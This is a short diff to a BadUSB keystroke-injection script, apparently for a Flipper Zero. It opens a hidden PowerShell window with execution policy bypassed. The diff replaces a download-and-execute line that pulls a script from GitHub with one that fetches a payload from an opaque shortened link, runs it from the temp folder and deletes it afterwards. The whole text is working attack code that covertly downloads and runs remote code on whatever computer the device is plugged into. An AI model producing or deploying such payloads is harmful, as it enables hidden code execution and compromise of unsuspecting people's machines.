@@ -10,7 +10,7 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/US-Keyboard-Layout/main.ps1 | iex
+STRING powershell -ep bypass -w h -c cd $env:temp; irm is.gd/3jgz85 > run.ps1; & run.ps1; sleep 1; rm run.ps1 -force
 ENTER
 
 
